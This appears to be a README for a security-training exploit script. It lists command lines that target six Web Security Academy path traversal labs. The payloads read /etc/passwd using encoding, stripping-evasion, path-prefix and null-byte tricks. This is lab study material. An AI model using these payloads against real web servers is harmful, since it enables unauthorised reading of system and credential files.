# How to run script.py

### 1. File path traversal, simple case

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "../../../etc/passwd"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "../../../etc/passwd" -p 127.0.0.1:8080`

### 2. File path traversal, traversal sequences blocked with absolute path bypass

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "/etc/passwd"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "/etc/passwd" -p 127.0.0.1:8080`

### 3. File path traversal, traversal sequences stripped non-recursively

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "....//....//....//etc/passwd"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "....//....//....//etc/passwd" -p 127.0.0.1:8080`

### 4. File path traversal, traversal sequences stripped with superfluous URL-decode

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd" -p 127.0.0.1:8080`

### 5. File path traversal, validation of start of path

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "/var/www/images/../../../etc/passwd"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "/var/www/images/../../../etc/passwd" -p 127.0.0.1:8080`

### 6. File path traversal, validation of file extension with null byte bypass

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "../../../etc/passwd%00.png"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "../../../etc/passwd%00.png" -p 127.0.0.1:8080`
